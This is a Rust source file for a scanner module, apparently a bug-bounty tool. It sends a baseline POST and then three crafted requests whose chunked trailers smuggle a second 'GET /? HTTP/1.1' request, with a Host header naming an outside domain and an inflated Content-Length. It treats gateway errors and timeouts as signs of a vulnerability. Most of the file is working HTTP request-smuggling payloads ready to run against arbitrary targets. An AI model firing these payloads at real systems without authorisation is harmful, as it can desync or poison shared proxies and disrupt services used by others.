use crate::core::constants::HTTP_USER_AGENT;
use crate::scanner::task::Task;
use async_trait::async_trait;
use riphttplib::H1;
use riphttplib::types::{ClientTimeouts, Header, ProtocolError, Request};
use std::time::Duration;

const CONNECT_TIMEOUT: Duration = Duration::from_secs(3);
const IO_TIMEOUT: Duration = Duration::from_secs(10);

#[derive(Clone, Copy, Default)]
pub struct TrailSmugTask;

impl TrailSmugTask {
    pub fn new() -> Self {
        Self
    }

    fn build_baseline_request(
        target: &str,
        timeouts: &ClientTimeouts,
    ) -> Result<Request, ProtocolError> {
        Ok(Request::new(target, "POST")?
            .header(Header::new(
                "user-agent".to_string(),
                HTTP_USER_AGENT.to_string(),
            ))
            .header(Header::new("bug-bounty".to_string(), "scan".to_string()))
            .header(Header::new("te".to_string(), "trailers".to_string()))
            .body("test")
            .trailer(Header::new("test".to_string(), "test".to_string()))
            .timeout(timeouts.clone())
            .follow_redirects(true))
    }

    fn build_attack_requests(
        target: &str,
        timeouts: &ClientTimeouts,
    ) -> Result<Vec<Request>, ProtocolError> {
        let mut payloads = Vec::with_capacity(3);

        payloads.push(
            Request::new(target, "POST")?
                .header(Header::new(
                    "user-agent".to_string(),
                    HTTP_USER_AGENT.to_string(),
                ))
                .header(Header::new("bug-bounty".to_string(), "scan".to_string()))
                .header(Header::new("te".to_string(), "trailers".to_string()))
                .body("test")
                .trailer(Header::new("any".to_string(), "header".to_string()))
                .trailer(Header::new("GET /?".to_string(), " HTTP/1.1".to_string()))
                .trailer(Header::new("Host".to_string(), "g0.5-4.cc".to_string()))
                .trailer(Header::new(
                    "Content-Length".to_string(),
                    "10000".to_string(),
                ))
                .timeout(timeouts.clone())
                .follow_redirects(true),
        );

        payloads.push(
            Request::new(target, "POST")?
                .header(Header::new(
                    "user-agent".to_string(),
                    HTTP_USER_AGENT.to_string(),
                ))
                .header(Header::new("bug-bounty".to_string(), "scan".to_string()))
                .header(Header::new("te".to_string(), "trailers".to_string()))
                .body("test")
                .trailer(Header::new_valueless("\n".to_string()))
                .trailer(Header::new("GET /?".to_string(), " HTTP/1.1".to_string()))
                .trailer(Header::new("Host".to_string(), "g0.5-4.cc".to_string()))
                .trailer(Header::new(
                    "Content-Length".to_string(),
                    "10000".to_string(),
                ))
                .timeout(timeouts.clone())
                .follow_redirects(true),
        );

        payloads.push(
            Request::new(target, "POST")?
                .header(Header::new(
                    "user-agent".to_string(),
                    HTTP_USER_AGENT.to_string(),
                ))
                .header(Header::new("bug-bounty".to_string(), "scan".to_string()))
                .header(Header::new("te".to_string(), "trailers".to_string()))
                .body("test")
                .trailer(Header::new_valueless("a".to_string()))
                .trailer(Header::new("GET /?".to_string(), " HTTP/1.1".to_string()))
                .trailer(Header::new("Host".to_string(), "g0.5-4.cc".to_string()))
                .trailer(Header::new(
                    "Content-Length".to_string(),
                    "10000".to_string(),
                ))
                .timeout(timeouts.clone())
                .follow_redirects(true),
        );

        Ok(payloads)
    }

    fn interpret_status(status: u16, target: &str) -> Option<String> {
        match status {
            504 => Some(format!("[+] gateway timeout! HTTP/1.1 {}", target)),
            503 => Some(format!("[?] service unavailable HTTP/1.1 {}", target)),
            502 => Some(format!("[?] bad gateway HTTP/1.1 {}", target)),
            _ => None,
        }
    }
}

#[async_trait(?Send)]
impl Task for TrailSmugTask {
    type Error = ProtocolError;

    async fn execute(&self, target: String) -> Result<String, Self::Error> {
        let timeouts = ClientTimeouts {
            connect: Some(CONNECT_TIMEOUT),
            read: Some(IO_TIMEOUT),
            write: Some(IO_TIMEOUT),
        };

        let client = H1::timeouts(timeouts.clone());

        let mut findings = Vec::new();

        // Send baseline request first; skip attacks if it already fails
        match client
            .send_request(Self::build_baseline_request(&target, &timeouts)?)
            .await
        {
            Ok(response) => {
                if Self::interpret_status(response.status, &target).is_some() {
                    return Ok(String::new());
                }
            }
            Err(ProtocolError::Timeout) => {
                if crate::is_verbose() {
                    eprintln!("TrailSmug baseline timed out for {}", target);
                }
                return Ok(String::new());
            }
            Err(err) => {
                if crate::is_verbose() {
                    eprintln!("TrailSmug baseline failed for {}: {}", target, err);
                }
                return Ok(String::new());
            }
        }

        for request in Self::build_attack_requests(&target, &timeouts)? {
            match client.send_request(request).await {
                Ok(response) => {
                    if let Some(message) = Self::interpret_status(response.status, &target) {
                        findings.push(message);
                    }
                }
                Err(ProtocolError::Timeout) => {
                    findings.push(format!("[?] timeout HTTP/1.1 {}", target));
                }
                Err(err) => {
                    if crate::is_verbose() {
                        eprintln!("TrailSmug request failed for {}: {}", target, err);
                    }
                }
            }
        }

        Ok(findings.join("\n"))
    }
}
